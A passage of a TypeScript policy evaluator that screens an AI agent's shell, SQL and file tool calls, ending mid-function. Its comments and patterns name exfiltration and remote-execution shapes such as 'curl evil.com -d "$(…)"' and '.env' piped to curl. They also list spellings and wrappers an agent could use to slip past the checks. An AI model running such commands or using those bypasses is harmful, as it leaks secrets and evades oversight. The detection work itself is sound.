// Stateless policy evaluator. The host passes config, args, optional
// context (agent, cwd, active environment) and an optional hook bag for
// I/O-bound checks (binary provenance, trusted-host lookup).
//
// Engine purity: no fs/path/os/process imports here. Anything that needs
// to touch the host system arrives via the hooks parameter.

import type { SmartRule } from '../types';
import { scanArgs } from '../dlp';
import {
  detectDangerousShellExec,
  analyzeShellCommand,
  analyzeFsOperation,
  analyzeSqlDestructive,
  analyzeChmod777,
  isRmCreatedInCommandCleanup,
  isBashTool,
  AST_FS_REGEX_RULES,
  extractShellDestinations,
  type ShellCommandAnalysis,
} from '../shell';
import { matchesPattern, evaluateSmartConditions, getNestedValue } from '../rules';
import { analyzePipeChain, splitOnPipe } from './pipe-chain';
import { extractAllSshHosts } from './ssh-parser';
import { evaluateEgress, type EgressPolicy } from '../egress';

// ── Public types ──────────────────────────────────────────────────────────────

export interface PolicyConfig {
  policy: {
    sandboxPaths: string[];
    dangerousWords: string[];
    ignoredTools: string[];
    toolInspection: Record<string, string>;
    smartRules: SmartRule[];
    dlp: {
      enabled: boolean;
      scanIgnoredTools: boolean;
      /** Inline-ask v2: 'block' upgrades review-severity DLP matches to a hard
       *  block. Optional for back-compat with callers that don't set it. */
      reviewAction?: 'review' | 'block';
    };
    /** Egress / destination control (GAP-5). Optional for back-compat with
     *  callers/tests that build a PolicyConfig without it. */
    egress?: EgressPolicy;
    /** Command-checks governance (command-checks-governance-spec.md): admin
     *  knobs for the built-in detections' REVIEW-severity findings only.
     *  Block-severity findings (pipe-critical, eval-remote, rm-rf-home,
     *  nuclear, suspect binary) have NO key here — non-weakenable by
     *  construction. Class-B keys (evalDynamic, pipeChainHigh) exclude 'off'.
     *  rmAdvisory is consumed by the PROXY at advisory-rule injection. */
    commandChecks?: {
      inlineExec?: 'off' | 'review' | 'block';
      rmAdvisory?: 'off' | 'review' | 'block';
      chmod?: 'off' | 'review' | 'block';
      sqlDdl?: 'off' | 'review' | 'block';
      evalDynamic?: 'review' | 'block';
      pipeChainHigh?: 'review' | 'block';
    };
  };
  settings: {
    mode: string;
  };
}

/** Resolve a command-check knob: unknown/absent → 'review' (today's default). */
function resolveCheck(v: string | undefined): 'off' | 'review' | 'block' {
  return v === 'off' || v === 'block' ? v : 'review';
}

/** Class-B variant — 'off' is not a legal outcome for tighten-only checks. */
function resolveCheckTight(v: string | undefined): 'review' | 'block' {
  return v === 'block' ? 'block' : 'review';
}

// ── Inline-execution detection (the policy-bypass tunnel) ────────────────────
// `python3 -c "<code>"` hides the real action inside a program command-level
// rules can't see. THREE spellings of the same tunnel (an agent that can pick
// its spelling picks the unchecked one — verified live 2026-07-25: the heredoc
// form sailed past the old -c-only pattern):
//   1. code as argument:  python3 -c / -e / -eval
//   2. code via stdin:    python3 - <<'PY' / python3 < file (heredoc/redirect)
//   3. code via pipe:     echo "code" | python3   (bare interpreter, no script)
//
// SEGMENT-BASED (/code-review round 2): the earlier ^-anchored regexes missed
// every chained/env-prefixed/path-qualified/versioned spelling (`cd x &&
// python3 -c`, `FOO=1 python3 -c`, `./venv/bin/python -c`, `python3.11 -c`).
// We split into simple-command segments, strip env assignments, normalize the
// interpreter to its basename, then reason about ARGS — which also fixes the
// pipe form's semantics: `cat data | node process.js` runs a SCRIPT (not
// inline), `cat data | node` executes its stdin (inline).
// Known limitation (accepted, same as the regex smart rules): splitting is
// quote-blind, so a separator INSIDE a quoted string can fabricate a segment;
// real quote-awareness means the mvdan AST — tracked as a follow-up.
const INLINE_INTERP =
  /^(python[\d.]*|bash|sh|zsh|perl|ruby|node|php|lua|deno|bun|pwsh|powershell(?:\.exe)?|osascript|rscript|irb)$/i;
// Shells participate ONLY via the explicit forms (-c/-e, the bare `-` stdin
// marker). The implicit-stdin rules must exclude them: `curl … | bash` belongs
// to the pipe-to-shell/eval-remote family (Class A — those tiers now run
// BEFORE this branch, but the exclusion stays so inline-exec never claims the
// shape), and `bash <<'EOF'` is the everyday multi-command idiom, not an
// inline-code tunnel.
const INLINE_SHELL = /^(bash|sh|zsh)$/i;

// Relay wrappers: they execute their operand command, so the interpreter hides
// one token deeper (`sudo python3 -c`, `timeout 5 python3 -c`). Verified live
// 2026-08-12: every one of these defeated the detector when it only looked at
// the segment head. Wrapper flags are consumed; the arg-taking ones also
// consume a duration/priority operand.
const INLINE_WRAPPERS = new Set([
  'env',
  'sudo',
  'doas',
  'command',
  'exec',
  'nohup',
  'setsid',
  'time',
  'xargs',
  'stdbuf',
  'timeout',
  'nice',
  'ionice',
]);
// Wrapper flags that take a SEPARATE operand (sudo -u www python3 …).
const WRAPPER_FLAG_ARG: Record<string, RegExp> = {
  sudo: /^-(u|g)$/,
  doas: /^-u$/,
  nice: /^-n$/,
  ionice: /^-(c|n)$/,
  timeout: /^-(k|s)$/,
};
// Wrappers whose first bare operand is numeric/duration (timeout 5, nice 10).
const WRAPPER_NUMERIC_ARG = new Set(['timeout', 'nice', 'ionice']);
// Shell keywords that can precede a simple command inside a segment
// (`if true; then python3 -c …; fi` — the `then` segment hid the interpreter).
const SHELL_KEYWORDS = new Set([
  'if',
  'then',
  'else',
  'elif',
  'fi',
  'do',
  'done',
  'while',
  'until',
  '!',
  '{',
  '}',
]);
// Perl/ruby bundle single-letter options, and the code flag rides the bundle:
// `perl -pe 's/x/y/'`, `ruby -ne '…'`, attached `perl -pe's/…/'`.
const PERLISH = /^(perl|ruby)$/i;

/** One simple-command segment: does it execute inline code? */
function inlineExecSegment(rawSeg: string, pipeFed: boolean): boolean {
  const tokens = rawSeg.trim().split(/\s+/).filter(Boolean);
  let i = 0;
  // Peel env assignments, shell keywords, and relay wrappers until the real
  // command head surfaces (each layer can repeat: `sudo env FOO=1 timeout 5 …`).
  for (;;) {
    while (i < tokens.length && /^[A-Za-z_]\w*=/.test(tokens[i])) i++;
    if (i >= tokens.length) return false;
    if (SHELL_KEYWORDS.has(tokens[i])) {
      i++;
      continue;
    }
    const headBase = (tokens[i].split('/').pop() ?? tokens[i]).toLowerCase();
    if (INLINE_WRAPPERS.has(headBase)) {
      i++;
      while (i < tokens.length) {
        const t = tokens[i];
        if (t.startsWith('-')) {
          i += WRAPPER_FLAG_ARG[headBase]?.test(t) ? 2 : 1;
          continue;
        }
        if (WRAPPER_NUMERIC_ARG.has(headBase) && /^\d+(\.\d+)?[smhd]?$/.test(t)) {
          i++;
          continue;
        }
        break;
      }
      continue;
    }
    break;
  }
  // Basename: /usr/bin/python3 and ./venv/bin/python are the interpreter too.
  const base = tokens[i].split('/').pop() ?? tokens[i];
  if (!INLINE_INTERP.test(base)) return false;
  const args = tokens.slice(i + 1);
  // deno spells its code form as a subcommand, not a flag.
  if (/^deno$/i.test(base) && /^eval$/i.test(args[0] ?? '')) return true;

  let hadRedirect = false;
  const positionals: string[] = [];
  for (let j = 0; j < args.length; j++) {
    const a = args[j];
    // 2a. explicit stdin marker: `python3 -` (with or without heredoc)
    if (a === '-') return true;
    if (a.startsWith('<')) {
      // `< file`, `<<EOF`, `<<'PY'`, `<<< "code"` — skip the operator (and a
      // detached target). The herestring is the same tunnel as the heredoc.
      hadRedirect = true;
      if (a === '<' || a === '<<' || a === '<<<') j++;
      continue;
    }
    if (a.startsWith('-')) {
      // 1. code as argument — detached flag, every mainstream spelling.
      if (/^--?(c|e|eval|command|enc|encodedcommand|print)$/i.test(a)) return true;
      // node's expression-print flag is code execution too.
      if (/^node$/i.test(base) && /^-p$/i.test(a)) return true;
      // attached code: `python3 -c'code'` / `-cCODE` (single-dash only).
      if (/^-[ce][^-\s]/.test(a)) return true;
      // perl/ruby option bundles ending in the code flag: -pe, -ne, -lane,
      // detached or attached-quoted (`perl -pe's/x/y/'`).
      if (PERLISH.test(base) && (/^-[a-z0-9]*e$/i.test(a) || /^-[a-z0-9]*e['"]/i.test(a)))
        return true;
      continue;
    }
    positionals.push(a);
  }
  // 2b/3. no script argument + code arriving via redirect or a pipe:
  // `python3 < payload.py`, `echo "code" | python3 -u`. A script WITH an
  // input redirect (`python3 app.py < data.txt`) has positionals → not
  // inline. Shells are excluded here (see INLINE_SHELL above).
  return positionals.length === 0 && (hadRedirect || pipeFed) && !INLINE_SHELL.test(base);
}

export function detectInlineExec(command: string): boolean {
  // Outer split: quote-aware pipe stages, so pipe-fed status is PER STAGE —
  // computing it over the whole command flagged any interpreter-with-flags
  // that merely coexisted with a pipe (`python3 --version | grep 3`).
  const stages = splitOnPipe(command);
  for (let s = 0; s < stages.length; s++) {
    // Inner split: remaining simple-command boundaries (quote-blind, same
    // accepted limitation as before — real quote-awareness is the mvdan AST,
    // tracked as a follow-up). Only the FIRST inner segment of a stage
    // receives the previous stage's stdin.
    const segments = stages[s].split(/\|\||&&|;|\n|\$\(|`|\(/);
    for (let k = 0; k < segments.length; k++) {
      if (inlineExecSegment(segments[k], s > 0 && k === 0)) return true;
    }
  }
  return false;
}

export interface PolicyContext {
  /** "Terminal" disables most blocks (manual user typing). */
  agent?: string;
  /** Working directory passed through to provenance hook. */
  cwd?: string;
  /**
   * Resolved environment block from getActiveEnvironment() in the host.
   * If `requireApproval === false`, strict mode skips the catch-all review.
   */
  activeEnvironment?: { requireApproval?: boolean };
  /**
   * Task #20: evaluate the full rule chain even for an ignoredTools match.
   * Set by the orchestrator's jail guard AFTER it has already found a
   * jailed/sensitive path in a file-tool call — without this, the tier-1
   * fast path below returns 'allow' before the jail shield's `tool:'*'`
   * rules are ever consulted, making the jail engine-invisible to
   * Read/Grep/Glob. Opt-in per call; never set on the hot path.
   */
  skipIgnoredFastPath?: boolean;
}

export type ProvenanceTrust = 'system' | 'managed' | 'user' | 'suspect' | 'unknown';

export interface ProvenanceLookup {
  resolvedPath: string;
  trustLevel: ProvenanceTrust;
  reason: string;
}

export interface PolicyHostHooks {
  /** Resolves an absolute binary path to a trust classification. */
  checkProvenance?: (binary: string, cwd?: string) => ProvenanceLookup;
  /** Returns true if the host is on the user's trusted-hosts allowlist. */
  isTrustedHost?: (host: string) => boolean;
}

export interface PolicyVerdict {
  decision: 'allow' | 'review' | 'block';
  blockedByLabel?: string;
  reason?: string;
  matchedField?: string;
  matchedWord?: string;
  tier?: 1 | 2 | 3 | 4 | 5 | 6 | 7;
  ruleName?: string;
  /** State predicates from the matched smart rule (only when decision is 'block'). */
  dependsOnStatePredicates?: string[];
  /** Recovery command to suggest when this rule hard-blocks (from SmartRule.recoveryCommand). */
  recoveryCommand?: string;
  /** Plain-English description of what the rule does (from SmartRule.description). */
  ruleDescription?: string;
}

// ── Internal helpers ──────────────────────────────────────────────────────────

const VERDICT_RANK: Record<SmartRule['verdict'], number> = {
  allow: 0,
  review: 1,
  block: 2,
};

/**
 * Resolve which of several MATCHING smart rules decides the verdict (the
 * pinned-only conflict engine, Phase 3b). The model:
 *   1. If any matching rule is `pinned` (a manager "keep mine" cloud rule),
 *      only the pinned rules compete and the MOST-RESTRICTIVE pinned wins
 *      (block > review > allow) — so a manager's locked rule can't be
 *      overridden by a developer's local rule.
 *   2. Otherwise the FIRST match wins — byte-for-byte the previous `.find()`
 *      behaviour. This is the zero-regression guarantee: with nothing pinned,
 *      nothing changes.
 * Exported so the resolution is unit-testable in isolation.
 */
export function resolvePinned(matches: SmartRule[]): SmartRule | undefined {
  if (matches.length === 0) return undefined;
  const pinned = matches.filter((r) => r.pinned);
  if (pinned.length === 0) return matches[0];
  return pinned.reduce((best, r) =>
    VERDICT_RANK[r.verdict] > VERDICT_RANK[best.verdict] ? r : best
  );
}

function tokenize(toolName: string): string[] {
  return toolName
    .toLowerCase()
    .split(/[_.\-\s]+/)
    .filter(Boolean);
}

function extractShellCommand(
  toolName: string,
  args: unknown,
  toolInspection: Record<string, string>
): string | null {
  const patterns = Object.keys(toolInspection);
  const matchingPattern = patterns.find((p) => matchesPattern(toolName, p));
  if (!matchingPattern) return null;
  const fieldPath = toolInspection[matchingPattern];
  const value = getNestedValue(args, fieldPath);
  return typeof value === 'string' ? value : null;
}

/** Returns true when a tool's inspected field is a shell command — i.e. the
 *  tool is shell-shaped even though its name is outside BASH_TOOL_NAMES
 *  (e.g. `terminal.execute`). Mirrors isSqlTool below. */
function inspectsShellCommand(toolName: string, toolInspection: Record<string, string>): boolean {
  const patterns = Object.keys(toolInspection);
  const matchingPattern = patterns.find((p) => matchesPattern(toolName, p));
  return matchingPattern !== undefined && toolInspection[matchingPattern] === 'command';
}

/** Returns true when a tool's inspected field is SQL (sql or query). */
function isSqlTool(toolName: string, toolInspection: Record<string, string>): boolean {
  const patterns = Object.keys(toolInspection);
  const matchingPattern = patterns.find((p) => matchesPattern(toolName, p));
  if (!matchingPattern) return false;
  const fieldName = toolInspection[matchingPattern];
  return fieldName === 'sql' || fieldName === 'query';
}

// SQL DML keywords — safe in a scoped context (WHERE clause present).
// Filtered from tokens so user dangerousWords like "delete"/"update" don't
// re-trigger after the WHERE-clause check has already passed.
const SQL_DML_KEYWORDS = new Set(['select', 'insert', 'update', 'delete', 'merge', 'upsert']);

/**
 * Checks a SQL string for dangerous unscoped mutations.
 * Returns a reason string if dangerous, null if safe.
 */
export function checkDangerousSql(sql: string): string | null {
  const norm = sql.replace(/\s+/g, ' ').trim().toLowerCase();
  const hasWhere = /\bwhere\b/.test(norm);

  if (/^delete\s+from\s+\S+/.test(norm) && !hasWhere)
    return 'DELETE without WHERE — full table wipe';

  if (/^update\s+\S+\s+set\s+/.test(norm) && !hasWhere)
    return 'UPDATE without WHERE — updates every row';

  return null;
}

/**
 * Translate a pipe-chain analysis into a PolicyVerdict, applying the
 * trust-host downgrade. Returns null when no verdict applies (no pipe, or
 * pipe risk below high). Shared between the early bash-command tier (which
 * pre-empts AST so trusted hosts still allow) and the existing tier-3
 * shellCommand path (which catches non-bash-tool config shapes).
 */
function pipeChainVerdict(
  command: string,
  isTrustedHost?: (host: string) => boolean,
  // Class B tighten-only knob (commandChecks.pipeChainHigh): floor verdict for
  // the HIGH tier's untrusted-sink case. Critical tier is Class A — untouched.
  highAction: 'review' | 'block' = 'review'
): PolicyVerdict | null {
  const pipeAnalysis = analyzePipeChain(command);
  if (!pipeAnalysis.isPipeline) return null;
  if (pipeAnalysis.risk !== 'critical' && pipeAnalysis.risk !== 'high') return null;

  const sinks = pipeAnalysis.sinkTargets;
  // sinks.length === 0 means no network targets were identified → treat as untrusted
  const allTrusted =
    sinks.length > 0 && sinks.every((host) => (isTrustedHost ? isTrustedHost(host) : false));

  if (pipeAnalysis.risk === 'critical') {
    if (allTrusted) {
      return {
        decision: 'review',
        blockedByLabel: 'Node9: Pipe-Chain to Trusted Host (obfuscated)',
        reason: `Obfuscated pipe to trusted host(s): ${sinks.join(', ')} — requires approval`,
        tier: 3,
      };
    }
    return {
      decision: 'block',
      blockedByLabel: 'Node9: Pipe-Chain Exfiltration (critical)',
      reason: `Sensitive file piped through obfuscator to network sink: ${pipeAnalysis.sourceFiles.join(', ')} → ${sinks.join(', ')}`,
      tier: 3,
    };
  }

  // high risk: trusted hosts → allow; untrusted → review
  if (allTrusted) {
    return {
      decision: 'allow',
      blockedByLabel: 'Node9: Pipe-Chain to Trusted Host',
      reason: `Sensitive file piped to trusted host(s): ${sinks.join(', ')}`,
      tier: 3,
    };
  }
  return {
    decision: highAction,
    blockedByLabel: 'Node9: Pipe-Chain Exfiltration (high)',
    reason: `Sensitive file piped to network sink: ${pipeAnalysis.sourceFiles.join(', ')} → ${sinks.join(', ')}`,
    tier: 3,
  };
}

// ── Public evaluator ──────────────────────────────────────────────────────────

/**
 * Stateless policy evaluation. Same waterfall as the original
 * proxy/src/policy/index.ts:evaluatePolicy, but config + context + I/O
 * hooks come in as parameters so this function works in any host.
 *
 * Returns 'allow' for ignored tools, the matched smart-rule verdict,
 * inline-execution review, eval-detection verdict, pipe-chain verdict,
 * provenance verdict, sandbox allow, dangerous-word review, or strict-mode
 * fallback. See the design doc for the full tier table.
 */
export async function evaluatePolicy(
  config: PolicyConfig,
  toolName: string,
  args?: unknown,
  context: PolicyContext = {},
  hooks: PolicyHostHooks = {}
): Promise<PolicyVerdict> {
  const { agent, cwd, activeEnvironment } = context;
  const { checkProvenance, isTrustedHost } = hooks;

  // 0. DLP Content Scanner — runs before ignoredTools fast path so credentials
  // in "safe" tools (ls, grep, cat) are always caught when scanIgnoredTools is on.
  // Uses scanArgs only (not scanFilePath): sensitive-path access is already covered
  // by smart rules; this tier catches secret content (AWS keys, tokens) in arg values.
  const wouldBeIgnored = matchesPattern(toolName, config.policy.ignoredTools);
  if (config.policy.dlp.enabled && (!wouldBeIgnored || config.policy.dlp.scanIgnoredTools)) {
    const dlpMatch = args !== undefined ? scanArgs(args) : null;
    if (dlpMatch) {
      return {
        // reviewAction:'block' (inline-ask v2): the admin upgraded
        // review-severity matches to a hard block — every evaluatePolicy
        // caller (orchestrator, explain, gateway) must agree with the gate.
        decision:
          dlpMatch.severity === 'block' || config.policy.dlp.reviewAction === 'block'
            ? 'block'
            : 'review',
        blockedByLabel: `DLP: ${dlpMatch.patternName}`,
        reason: `${dlpMatch.patternName} detected in ${dlpMatch.fieldPath}`,
      };
    }
  }

  // 1. Ignored tools (Fast Path) - Always allow these first
  // Task #20: the jail guard sets skipIgnoredFastPath after finding a jailed
  // path in a file-tool call — the shield's rules must get to speak.
  if (wouldBeIgnored && !context.skipIgnoredFastPath) return { decision: 'allow' };

  // ONE definition of "this tool carries a shell command": a BASH_TOOL_NAMES
  // spelling, or a toolInspection 'command' field (terminal.execute). Every
  // shell-facing decision below keys off this — the AST tiers, the rm waiver,
  // AST suppression, and the smart-rule alias. Keeping them in sync is
  // load-bearing: /code-review 2026-08-13 found that matching rules by
  // shell-shape while gating AST tiers on isBashTool alone left
  // `terminal.execute` running the AST-superseded REGEX twins with no AST to
  // correct them — resurrecting the `grep "drop table"` false positive and
  // making commandChecks.chmod/sqlDdl inoperative for that tool.
  const shellShaped =
    isBashTool(toolName) || inspectsShellCommand(toolName, config.policy.toolInspection);
  const shellShapedCommand = shellShaped
    ? isBashTool(toolName) && args && typeof args === 'object'
      ? typeof (args as Record<string, unknown>).command === 'string'
        ? ((args as Record<string, unknown>).command as string)
        : null
      : extractShellCommand(toolName, args, config.policy.toolInspection)
    : null;

  // AST FS-op gate — only fires for AI-driven calls. node9 is AI-driven; manual
  // (Terminal) users are trusted and reach the tier-4 manual auto-allow without
  // AST/regex interference. Mirrors the CLI scan's per-agent gates
  // (scan.ts:1037, 1319, 1614).
  const bashCommand = agent !== 'Terminal' ? shellShapedCommand : null;

  // Layer-1 invariant: built-in AST blocks (block-rm-rf-home, project-jail
  // sensitive-file reads) must fire BEFORE user smart rules so a permissive
  // user allow rule cannot bypass them. Pipe-chain trust-host analysis runs
  // FIRST so an explicit trusted-host pipe (e.g. cat .env | curl
  // https://trusted.com) can still downgrade AST's block — trust list is an
  // explicit user opt-in. See core.test.ts:1763 and v1.4.0-trusted-hosts.
  if (bashCommand !== null) {
    const pipeVerdict = pipeChainVerdict(
      bashCommand,
      isTrustedHost,
      resolveCheckTight(config.policy.commandChecks?.pipeChainHigh)
    );
    if (pipeVerdict) return pipeVerdict;

    const fsVerdict = analyzeFsOperation(bashCommand);
    if (fsVerdict) {
      const isShieldRule = fsVerdict.ruleName.startsWith('shield:');
      const labelPrefix = isShieldRule ? 'project-jail (AST)' : 'Node9 (AST)';
      return {
        decision: fsVerdict.verdict,
        blockedByLabel: `${labelPrefix}: ${fsVerdict.ruleName}`,
        reason: fsVerdict.reason,
        tier: 2,
        ruleName: fsVerdict.ruleName,
        ruleDescription: fsVerdict.reason,
      };
    }

    // SQL-DDL via a real DB CLI — AST-aware so a grep/echo of "drop table" /
    // "|mysql" no longer false-positives (the regex smart rule is suppressed for
    // bash via AST_FS_REGEX_RULES). Mirrors the rm/sudo/chmod AST migrations.
    const sqlAction = resolveCheck(config.policy.commandChecks?.sqlDdl);
    const sqlVerdict = sqlAction === 'off' ? null : analyzeSqlDestructive(bashCommand);
    if (sqlVerdict) {
      return {
        // analyzeSqlDestructive is typed review-only, so the knob maps 1:1.
        decision: sqlAction === 'block' ? 'block' : 'review',
        blockedByLabel: `Node9 (AST): ${sqlVerdict.ruleName}`,
        reason: sqlVerdict.reason,
        tier: 2,
        ruleName: sqlVerdict.ruleName,
        ruleDescription: sqlVerdict.description,
      };
    }

    // chmod 777 / 0777 / a+rwx (world-writable only; +x is execute-only and
    // excluded) via a real chmod command — AST-aware so
    // `chmod 777` inside a `node -e` / `python -c` string or regex literal no
    // longer false-positives (the regex smart rule is suppressed for bash via
    // AST_FS_REGEX_RULES). Mirrors the SQL-DDL AST migration above. The rule
    // name is shield-prefixed, so use the project-jail (AST) label like the
    // fs-op branch does for shield rules.
    const chmodAction = resolveCheck(config.policy.commandChecks?.chmod);
    const chmodVerdict = chmodAction === 'off' ? null : analyzeChmod777(bashCommand);
    if (chmodVerdict) {
      return {
        // analyzeChmod777 is typed review-only, so the knob maps 1:1.
        decision: chmodAction === 'block' ? 'block' : 'review',
        blockedByLabel: `project-jail (AST): ${chmodVerdict.ruleName}`,
        reason: chmodVerdict.reason,
        tier: 2,
        ruleName: chmodVerdict.ruleName,
        ruleDescription: chmodVerdict.description,
      };
    }
  }

  // 2. Smart Rules — raw args matching before tokenization.
  // When AST ran on this bash command, suppress regex rules whose detection
  // AST already provides — they FP on JSON args, heredocs, and chained-command
  // segments that AST handles correctly. Mirrors scan.ts:1059.
  if (config.policy.smartRules.length > 0) {
    // Pinned-only conflict engine (Phase 3b): collect all matches (same
    // predicate as the old first-match `.find()`), then resolve — a pinned
    // manager rule wins; otherwise the first match wins (unchanged).
    // Waive the built-in `review-rm` advisory for a same-command create-then-
    // delete scratch cleanup (`cat > f <<EOF…; rm -f f`). Gated on
    // verdict==='review' so the waiver can ONLY drop a review prompt, never a
    // block — a user/org rule that reuses the name `review-rm` but BLOCKS is
    // still enforced. block-rm-rf-home (earlier tier), allow-rm-safe-paths, and
    // all other user rules are unaffected. (Name coupling to the proxy-side
    // ADVISORY_SMART_RULES 'review-rm' is intentional; see src/config/index.ts.)
    const rmCleanupWaiver = bashCommand !== null && isRmCreatedInCommandCleanup(bashCommand);
    // AST suppression is knob- and PIN-aware. Family-off semantics: a Class-C
    // knob 'off' silences the whole family INCLUDING its regex twin (deliberate
    // — sqlDdl:'off' must not resurrect the raw-regex rule and its FPs). The
    // one exception is a cloud-PINNED (mandated) rule: the org mandated that
    // shield on purpose, so a knob 'off' — reachable from a repo-carried
    // config file — must not kill it. With the AST tier knob-disabled, the
    // pinned rule is the only remaining guard and must speak.
    const astSuppressed = (rule: SmartRule): boolean => {
      if (bashCommand === null || !rule.name || !AST_FS_REGEX_RULES.has(rule.name)) return false;
      const knob =
        rule.name === 'review-drop-truncate-shell'
          ? resolveCheck(config.policy.commandChecks?.sqlDdl)
          : rule.name === 'shield:filesystem:review-chmod-777'
            ? resolveCheck(config.policy.commandChecks?.chmod)
            : undefined;
      if (knob === 'off' && rule.pinned) return false;
      return true;
    };
    // Bypass-by-spelling closure: rules written for `bash` (the six default
    // shell-safety rules, shield rules like bash-safe) must cover EVERY tool
    // that carries a shell command — `shell`, `run_shell_command`,
    // `execute_bash`, `terminal.execute` (via toolInspection) — or an agent's
    // tool-name spelling silently voids sudo/pipe-to-shell/force-push coverage
    // (verified live 2026-08-12: all four read `allow` on defaults).
    // `shellShaped` is computed once above and shared with the AST tiers.
    const matches = config.policy.smartRules.filter(
      (rule) =>
        (matchesPattern(toolName, rule.tool) ||
          (shellShaped && matchesPattern('bash', rule.tool))) &&
        !astSuppressed(rule) &&
        !(rmCleanupWaiver && rule.name === 'review-rm' && rule.verdict === 'review') &&
        evaluateSmartConditions(args, rule)
    );
    const matchedRule = resolvePinned(matches);
    if (matchedRule) {
      if (matchedRule.verdict === 'allow')
        return { decision: 'allow', ruleName: matchedRule.name ?? matchedRule.tool };
      return {
        decision: matchedRule.verdict,
        blockedByLabel: `Smart Rule: ${matchedRule.name ?? matchedRule.tool}`,
        reason: matchedRule.reason,
        tier: 2,
        ruleName: matchedRule.name ?? matchedRule.tool,
        ...((matchedRule.description ?? matchedRule.reason) && {
          ruleDescription: matchedRule.description ?? matchedRule.reason,
        }),
        ...(matchedRule.verdict === 'block' &&
          matchedRule.dependsOnState?.length && {
            dependsOnStatePredicates: matchedRule.dependsOnState,
          }),
        ...(matchedRule.verdict === 'block' &&
          matchedRule.recoveryCommand && {
            recoveryCommand: matchedRule.recoveryCommand,
          }),
      };
    }
  }

  let allTokens: string[] = [];
  let pathTokens: string[] = [];

  // 3. Tokenize the input
  const shellCommand = extractShellCommand(toolName, args, config.policy.toolInspection);
  if (shellCommand) {
    const analyzed: ShellCommandAnalysis = analyzeShellCommand(shellCommand);
    allTokens = analyzed.allTokens;
    pathTokens = analyzed.paths;

    // AST-based eval detection — structurally accurate, not fooled by string content
    const evalVerdict = detectDangerousShellExec(shellCommand);
    if (evalVerdict === 'block') {
      return {
        decision: 'block',
        blockedByLabel: 'Node9: Eval Remote Execution',
        reason: 'eval of remote download (curl/wget) is a near-certain supply-chain attack',
        ruleDescription:
          'The AI is downloading a script from the internet and running it immediately without inspection. This is a common way malware gets installed.',
        tier: 3,
      };
    }
    // NOTE: the eval-DYNAMIC (review) branch deliberately runs LAST, after
    // pipe-chain and inline-exec — see the end of this block. Only the
    // eval-REMOTE block above is Class A and must pre-empt everything.

    // ── Pipe-chain exfiltration detection ────────────────────────────────────
    // Already evaluated for bash-tool calls in the early Layer-1 block above.
    // Re-runs here for tools whose command field is exposed via toolInspection
    // but whose name is not in BASH_TOOL_NAMES. analyzePipeChain is cheap on
    // non-pipe input.
    const ptVerdict = pipeChainVerdict(
      shellCommand,
      isTrustedHost,
      resolveCheckTight(config.policy.commandChecks?.pipeChainHigh)
    );
    if (ptVerdict) return ptVerdict;

    // Inline arbitrary code execution — governed by commandChecks.inlineExec
    // ('off' | 'review' (default) | 'block'). MUST run AFTER eval-remote and
    // pipe-chain above: this Class-C tier defaults to review, and for tools
    // outside BASH_TOOL_NAMES (e.g. terminal.execute via toolInspection) the
    // early Layer-1 block never ran — with inline-exec first, a Class-A
    // pipe-chain CRITICAL exfil was downgraded to review, and 'off' perversely
    // restored the block (found by /code-review 2026-08-12; the bash path was
    // always safe because Layer-1 runs pipe-chain first).
    const inlineAction = resolveCheck(config.policy.commandChecks?.inlineExec);
    if (inlineAction !== 'off' && detectInlineExec(shellCommand)) {
      return {
        decision: inlineAction === 'block' ? 'block' : 'review',
        blockedByLabel: 'Node9 Standard (Inline Execution)',
        ruleDescription:
          'The AI is running code directly from the command line. Review the full script below before allowing it to execute.',
        tier: 3,
      };
    }

    // Eval of DYNAMIC content (variable / subshell expansion) — Class B,
    // tighten-only: commandChecks.evalDynamic may upgrade to block but can
    // never turn this off. Runs AFTER inline-exec by design: it defaults to
    // 'review', so evaluating it first silently downgraded an org's
    // inlineExec:'block' to a prompt for `bash -c "$(…)"` — the strictly MORE
    // dangerous spelling of the same tunnel (/code-review 2026-08-13).
    if (evalVerdict === 'review') {
      return {
        decision: resolveCheckTight(config.policy.commandChecks?.evalDynamic),
        blockedByLabel: 'Node9: Eval Dynamic Content',
        reason: 'eval of dynamic content (variable or subshell expansion) requires approval',
        ruleDescription:
          'The AI is running a command that includes a variable or subshell expansion. The actual command executed at runtime may differ from what is shown here.',
        tier: 3,
      };
    }

    // ── Egress / destination control (GAP-5) ────────────────────────────────
    // Gate WHERE network tools send data (curl/wget/scp/ssh/nc) against the
    // egress allow/deny policy. Opt-in (egress.enabled). Catches exfil to an
    // untrusted host even when the payload is dynamic (curl evil.com -d "$(…)")
    // — the destination is literal in the command. 'review' routes to the human
    // via the normal policyResult path (ruleName set ⇒ reliable human review).
    if (config.policy.egress?.enabled) {
      const dests = extractShellDestinations(shellCommand);
      if (dests.length > 0) {
        const eg = evaluateEgress(dests, config.policy.egress);
        if (eg) {
          return {
            decision: eg.verdict,
            blockedByLabel:
              eg.verdict === 'block' ? '🌐 Node9 Egress (Blocked)' : '🌐 Node9 Egress (Review)',
            reason: eg.reason,
            ruleName: `egress:${eg.binary}:${eg.host}`,
            ruleDescription: eg.reason,
            tier: eg.verdict === 'block' ? 3 : 4,
          };
        }
      }
    }

    // ── SSH multi-hop host extraction ─────────────────────────────────────────
    // Runs only for ssh/scp/rsync to extract all involved hosts (including jump hosts).
    // Currently surfaced via tokens for dangerous-word scanning below.
    const firstToken = analyzed.actions[0] ?? '';
    if (['ssh', 'scp', 'rsync'].includes(firstToken)) {
      const rawTokens = shellCommand.trim().split(/\s+/);
      const sshHosts = extractAllSshHosts(rawTokens.slice(1));
      allTokens.push(...sshHosts);
    }

    // ── Binary provenance check ───────────────────────────────────────────────
    // Only check absolute paths (e.g. /tmp/curl). Bare command names (npm, curl)
    // require PATH resolution which varies by environment (nvm, volta, CI toolcache)
    // and causes false positives. Skips entirely when no provenance hook is wired.
    if (firstToken && firstToken.startsWith('/') && checkProvenance) {
      const prov = checkProvenance(firstToken, cwd);
      if (prov.trustLevel === 'suspect') {
        return {
          decision: config.settings.mode === 'strict' ? 'block' : 'review',
          blockedByLabel: 'Node9: Suspect Binary',
          reason: `Binary "${firstToken}" resolved to ${prov.resolvedPath} — ${prov.reason}`,
          tier: 3,
        };
      }
      if (prov.trustLevel === 'unknown' && config.settings.mode === 'strict') {
        return {
          decision: 'review',
          blockedByLabel: 'Node9: Unknown Binary (strict mode)',
          reason: `Binary "${firstToken}" — ${prov.reason}`,
          tier: 3,
        };
      }
    }

    // Strip DML keywords from tokens so user dangerousWords like "delete"/"update"
    // don't re-flag a SQL query that already passed the smart rules check above.
    if (isSqlTool(toolName, config.policy.toolInspection)) {
      allTokens = allTokens.filter((t) => !SQL_DML_KEYWORDS.has(t.toLowerCase()));
    }
  } else {
